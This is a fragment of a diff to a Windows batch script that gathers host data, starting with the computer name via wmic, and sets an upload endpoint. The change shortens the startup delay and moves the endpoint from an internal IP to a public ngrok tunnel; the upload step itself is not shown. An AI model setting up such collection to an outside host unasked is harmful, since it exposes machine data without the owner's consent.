@@ -3,7 +3,7 @@ if %os%==Windows_NT goto WINNT
 goto NOCON
 
 :WINNT
-timeout /t 600
+timeout /t 10
 echo Using a Windows NT based system
 
 echo Getting data [Computer: %computername%]...
@@ -11,8 +11,8 @@ echo Please Wait...
 
 REM set variables
 set system=
-set uploadUrl="http://10.34.173.181/upload"
-REM set uploadUrl="http://127.0.0.1/upload"
+REM set uploadUrl="http://10.34.173.181/upload"
+set uploadUrl=" http://a6dc-2001-b011-e010-9dc3-8cf9-bfa-f5d3-76aa.ngrok.io/upload"
 
 REM Get Computer Name
 FOR /F "tokens=2 delims='='" %%A in ('wmic OS Get csname /value') do SET system=%%A
